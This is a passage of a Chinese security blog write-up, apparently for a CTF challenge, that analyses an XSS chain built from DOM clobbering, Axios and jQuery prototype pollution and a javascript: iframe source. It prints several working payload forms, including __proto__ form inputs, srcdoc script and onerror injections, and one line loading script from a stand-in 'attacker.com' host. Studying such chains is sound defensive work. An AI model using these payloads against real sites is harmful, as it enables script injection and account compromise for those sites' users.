class="keyword">return</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;img.avatar&quot;</span>).attr(<span class="string">&quot;src&quot;</span>, repo.owner.avatar_url);</span><br><span class="line">$(<span class="string">&quot;#description&quot;</span>).text(repo.description);</span><br><span class="line"><span class="keyword">if</span> (repo.homepage &amp;&amp; repo.homepage.startsWith(<span class="string">&quot;https://&quot;</span>)) &#123;</span><br><span class="line">    $(<span class="string">&quot;#homepage&quot;</span>).attr(&#123;</span><br><span class="line">        <span class="string">&quot;src&quot;</span>: repo.homepage,</span><br><span class="line">        <span class="string">&quot;hidden&quot;</span>: <span class="literal">false</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong><font style="color:rgb(0, 0, 0) !important;">jQuery 核心 API</font></strong><font style="color:rgb(0, 0, 0);">：</font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;$()&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">（元素选择）、</font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;attr()&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">（属性操作）、</font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;text()&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">（文本操作），是前端开发中 “操作 DOM” 的经典用法。</font></li>
+</ul>
+<p><font style="color:rgb(0, 0, 0);">这里提供了一个如下功能</font></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将 “加载中” 图片的hidden属性设为<span class="literal">true</span>，隐藏该图片（表示加载完成或无需显示）。</span><br><span class="line">确保repo数据的完整性，若关键的owner信息缺失，直接提示并退出，避免后续代码报错。</span><br><span class="line">从repo.owner中提取头像 URL（avatar_url），将其赋值给头像图片的src属性，实现头像加载。</span><br><span class="line">将repo中的描述信息（description）填充到页面的描述区域。</span><br><span class="line">安全校验链接后，将官网地址赋值给目标元素并显示，避免无效或不安全链接加载。</span><br></pre></td></tr></table></figure></div>
+
+<p>我们如果可以控制search的结果自然可以返回一个恶意构造的json格式</p>
+<p>关键还是在<code>$(&quot;img.avatar&quot;).attr(&quot;src&quot;, repo.owner.avatar_url);</code></p>
+<p>我们构造<code>data:,&#123;&quot;owner&quot;:&#123;&quot;avatar_url&quot;:&quot;javascript:alert(1)&quot;&#125;&#125;#</code></p>
+<p>这样似乎能触发javascript伪协议？并非，这里只是img</p>
+<p>所以还是要借助jquery的供应链漏洞~</p>
+<h4 id="打法"><a href="#打法" class="headerlink" title="打法"></a>打法</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img name=<span class="string">&quot;namespaceURI&quot;</span>&gt;</span><br><span class="line">成功Clobbing</span><br><span class="line">document.namespaceURI = &lt;img element&gt;</span><br><span class="line">导致 jQuery 误以为：</span><br><span class="line">“这是一个 XML 文档，不是 HTML。”</span><br></pre></td></tr></table></figure></div>
+
+<p>然后该库会进行如下操作</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">于是它不走 optimized 查找流程，而会走：</span><br><span class="line"></span><br><span class="line">✔ jQuery.select() → 可被污染</span><br><span class="line">✔ 使用 tokenized selector → 可被 cache 覆盖</span><br><span class="line">✔ relative matcher → 可劫持</span><br><span class="line"></span><br><span class="line">这是整题最关键的触发器。</span><br></pre></td></tr></table></figure></div>
+
+<p>攻击目标：<strong>让任何 selector 匹配我们想让它匹配的元素（iframe）。</strong></p>
+<p>因为 iframe 支持 js: 协议，所以是最终 XSS 的必经之路。</p>
+<p>为了做到：<code>$(&quot;img.avatar&quot;) → 返回 iframe</code>，需进行下述污染</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__proto__[<span class="string">&quot;TAG&quot;</span>][dir] = <span class="string">&quot;ownerDocument&quot;</span></span><br><span class="line">__proto__[<span class="string">&quot;TAG&quot;</span>][next] = <span class="string">&quot;parentNode&quot;</span></span><br><span class="line">__proto__[<span class="string">&quot;CLASS&quot;</span>][dir] = <span class="string">&quot;nextSibling&quot;</span></span><br><span class="line">__proto__[<span class="string">&quot;CLASS&quot;</span>][first] = <span class="string">&quot;true&quot;</span></span><br><span class="line"></span><br><span class="line">让所有 selector 都“相对匹配”</span><br><span class="line">所有节点都会被遍历</span><br><span class="line">matcher 被 forced 触发</span><br><span class="line">最终 selector 匹配 所有元素</span><br><span class="line">然后：</span><br><span class="line">$(<span class="string">&quot;img.avatar&quot;</span>) 返回所有元素，包括 iframe</span><br></pre></td></tr></table></figure></div>
+
+<p>这里<code>$(&quot;img.avatar&quot;).attr(&quot;src&quot;, repo.owner.avatar_url);</code>知道<code>.attr</code>类似<code>element.setAttribute(&quot;src&quot;, value)</code></p>
+<p>即设置了iframe.src我们知道这里是可以触发伪协议的~</p>
+<h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTML Injection</span><br><span class="line">    ↓</span><br><span class="line">DOM <span class="title function_">Clobbering</span> <span class="params">(namespaceURI)</span></span><br><span class="line">    ↓</span><br><span class="line">Axios Prototype <span class="title function_">Pollution</span> <span class="params">(__proto__.baseURL)</span></span><br><span class="line">    ↓</span><br><span class="line">Control Axios response via data:, JSON</span><br><span class="line">    ↓</span><br><span class="line">Pollute jQuery selector system</span><br><span class="line">    ↓</span><br><span class="line">Make $(<span class="string">&quot;img.avatar&quot;</span>) match iframe</span><br><span class="line">    ↓</span><br><span class="line">iframe.src = <span class="string">&quot;javascript:alert(1)&quot;</span></span><br><span class="line">    ↓</span><br><span class="line">XSS</span><br></pre></td></tr></table></figure></div>
+
+<p>很建议大家看看wp，更细节的讲了一下供应链洞咋来的</p>
+<p>而且这道题也有如下打法-原型链污染一出，一堆打法hh</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=search&gt;</span><br><span class="line">	&lt;input name=<span class="string">&quot;__proto__.owner&quot;</span> value=<span class="string">&quot;x&quot;</span>&gt;</span><br><span class="line">	&lt;input name=<span class="string">&quot;__proto__.homepage&quot;</span> value=<span class="string">&quot;https://attacker.com/xss.js&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=<span class="string">&quot;search&quot;</span>&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;__proto__.[srcdoc]&quot;</span> value=<span class="string">&quot;&lt;script&gt;alert(parent.window.location.origin)&lt;/script&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;__proto__.[srcdoc]&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;__proto__.homepage&quot;</span> value=<span class="string">&quot;https://example.com&quot;</span>&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;__proto__.owner.avatar_url&quot;</span> value=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=<span class="string">&quot;search&quot;</span>&gt; </span><br><span class="line">    &lt;input name=<span class="string">&quot;q&quot;</span> value=<span class="string">&quot;siege-media/contrast-ratio&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;__proto__.srcdoc=test&quot;</span> value=<span class="string">&quot;test&quot;</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;__proto__.srcdoc&quot;</span> value=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg&gt;</span><br><span class="line">    &lt;image id=homepage&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">    &lt;input name=__proto__.owner value=polluted&gt;</span><br><span class="line">    &lt;input name=__proto__.homepage value=https:<span class="comment">//example.com&gt;</span></span><br><span class="line">    &lt;input name=__proto__.href value=x&gt;</span><br><span class="line">    &lt;input name=__proto__.onerror value=alert(origin)&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=<span class="string">&quot;search&quot;</span>&gt; </span><br><span class="line">&lt;input name=<span class="string">&quot;q&quot;</span> value=<span class="string">&quot;angular/material-start&quot;</span>&gt; </span><br><span class="line">&lt;input name=<span class="string">&quot;__proto__.ONLOAD&quot;</span> value=<span class="string">&quot;alert()&quot;</span>/&gt; </span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>最值得关注的是这个</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">&quot;search&quot;</span>&gt;</span><br><span class="line">  &lt;input name=<span class="string">&quot;__proto__.needsContext&quot;</span> value=<span class="string">&quot;x&quot;</span> id=<span class="string">&quot;y&quot;</span> /&gt;</span><br><span class="line">  &lt;input</span><br><span class="line">    name=<span class="string">&quot;__proto__.selector[]&quot;</span></span><br><span class="line">    value=<span class="string">&quot;&lt;img/src/onerror=alert(document.domain)&gt;&quot;</span></span><br><span class="line">  /&gt;</span><br><span class="line">  &lt;input name=<span class="string">&quot;__proto__.handler[]&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">  &lt;input name=<span class="string">&quot;__proto__.delegateType&quot;</span> value=<span class="string">&quot;focus&quot;</span> /&gt;</span><br><span class="line">  &lt;input name=<span class="string">&quot;__proto__.owner&quot;</span> value=<span class="string">&quot;x&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p> 发现了一个 <strong>全新的 jQuery Prototype Pollution Gadget</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">污染 jQuery 的 event handler 内部结构 → 控制 handleObj.selector → 让 jQuery 在内部调用 jQuery(sel) 时把 sel 当作 HTML 解析 → 触发 innerHTML sink → XSS。</span><br><span class="line">这条链和另外两条完全不一样——它利用的是：</span><br><span class="line">jQuery event system（事件系统）</span><br><span class="line">jQuery.handler / handleObj 结构</span><br><span class="line">jQuery 的内部 selector→parseHTML→innerHTML 机制</span><br><span class="line">For..in + Prototype Pollution</span><br><span class="line">NeedsContext 判断绕过</span><br><span class="line">Array.toString() → 自动拼出 HTML 字符串</span><br><span class="line">这是一个 Pure JavaScript Gadget Chain。</span><br><span class="line">攻击点不依赖 iframe、不依赖 src 或 srcdoc，也不依赖 attr()。</span><br></pre></td></tr></table></figure></div>
+
+<p>这里不做分析了，总结如下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一句话高度总结 <span class="meta">@joaxcar</span> 的打法</span><br><span class="line">污染 jQuery 的事件系统，控制内部 selector，使 jQuery 在内部对 HTML 字符串执行 parseHTML，从而通过 innerHTML sink 触发 XSS。</span><br><span class="line">这是一个真正的 Prototype Pollution → jQuery Gadget → XSS 漏洞链。</span><br></pre></td></tr></table></figure></div>
+
+<p>这些师傅各个都是xss高手啊xm</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>真的很优雅，是我打不出来的操作()</p>
+<p>这里推荐一些供应链安全的仓库</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/BlackFan/client-side-prototype-pollution">https://github.com/BlackFan/client-side-prototype-pollution</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/snyk-labs/nodejs-goof">https://github.com/snyk-labs/nodejs-goof</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.</span> <span class="toc-text">学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#axios"><span class="toc-number">2.1.</span> <span class="toc-text">axios</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jquery"><span class="toc-number">2.2.</span> <span class="toc-text">jquery</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E6%B3%95"><span class="toc-number">2.2.1.</span> <span class="toc-text">打法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E8%A7%88"><span class="toc-number">2.3.</span> <span class="toc-text">总览</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">3.</span> <span class="toc-text">结语</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&text=一次典型xss的多漏洞利用链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&title=一次典型xss的多漏洞利用链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&is_video=false&description=一次典型xss的多漏洞利用链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一次典型xss的多漏洞利用链&body=Check out this article: https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&title=一次典型xss的多漏洞利用链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&title=一次典型xss的多漏洞利用链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&title=一次典型xss的多漏洞利用链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&title=一次典型xss的多漏洞利用链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&name=一次典型xss的多漏洞利用链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/&t=一次典型xss的多漏洞利用链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
